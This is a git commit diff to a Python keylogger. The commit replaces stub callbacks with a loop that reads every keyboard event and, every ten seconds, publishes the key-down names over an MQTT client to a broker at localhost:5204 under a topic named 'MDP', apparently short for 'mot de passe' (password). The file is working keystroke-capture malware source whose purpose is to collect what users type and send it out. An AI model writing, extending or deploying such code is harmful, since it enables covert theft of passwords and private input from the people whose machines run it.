a679552c4a6fa563148f0ec9bf52a4c3558aa33b
Antoine <>
2022-02-21 18:40:31 +0100

    continue: Fin du keylogger, envoie via MQTT

--- src/KeyLogger/keylogger.py
+++ src/KeyLogger/keylogger.py
@@ -2,80 +2,43 @@ import time
 from threading import Timer
 
 import keyboard
+import paho.mqtt.client as mqtt
 
 SEND_LOG_EVERY = 10
 
 
 class Keylogger:
     def __init__(self):
-        self.keystrokes = ""
+        self.keystrokes = []
         self.file = f"log_{time.time()}.txt"
-
-    def callback(self, event):
-        name = event.name
-        if len(name) > 1:
-            '''if name == "space":
-                # " " instead of "space"
-                name = " "
-            elif name == "enter":
-                # add a new line whenever an ENTER is pressed
-                name = "[ENTER]\n"
-            elif name == "decimal":
-                name = "."
-            else:
-                # replace spaces with underscores
-                name = name.replace(" ", "_")
-                name = f"[{name.upper()}]"
-                '''
-        self.keystrokes += str(event) + '\n'
-
-    def callback2(self, event):
-        name = event.name
-        if len(name) > 1:
-            '''if name == "space":
-                # " " instead of "space"
-                name = " "
-            elif name == "enter":
-                # add a new line whenever an ENTER is pressed
-                name = "[ENTER]\n"
-            elif name == "decimal":
-                name = "."
-            else:
-                # replace spaces with underscores
-                name = name.replace(" ", "_")
-                name = f"[{name.upper()}]"
-                '''
-        self.keystrokes += str(event) + '\n'
+        self.pressed = {}
+        self.client = mqtt.Client()
+        self.client.connect("localhost", 5204)
 
     def write_to_file(self):
+        keys = ""
         with open(self.file, "a") as f:
-            print(self.keystrokes, file=f)
+            for key, event_type in self.keystrokes:
+                if event_type == "down":
+                    keys += key + ' '
+        self.client.publish("MDP", keys)
 
     def log(self):
-        if self.keystrokes:
+        if self.keystrokes and not any(self.pressed.values()):
             self.write_to_file()
-        self.keystrokes = ""
+            self.keystrokes = []
         timer = Timer(interval=SEND_LOG_EVERY, function=self.log)
         timer.daemon = True
         timer.start()
 
     def start(self):
-        keyboard.on_press(callback=self.callback)
-        keyboard.on_release(callback=self.callback2)
         self.log()
-        keyboard.wait()
+        while True:
+            event: keyboard._keyboard_event.KeyboardEvent = keyboard.read_event()
+            self.keystrokes.append((event.name, event.event_type))
+            self.pressed[event.scan_code] = event.event_type == "down"
 
 
 if __name__ == "__main__":
-
-    l = []
-    i = 0
-    while i < 20:
-        rk = keyboard.read_event()
-        l.append(rk)
-        i += 1
-    print(l)
-    '''
     keylogger = Keylogger()
     keylogger.start()
-    '''
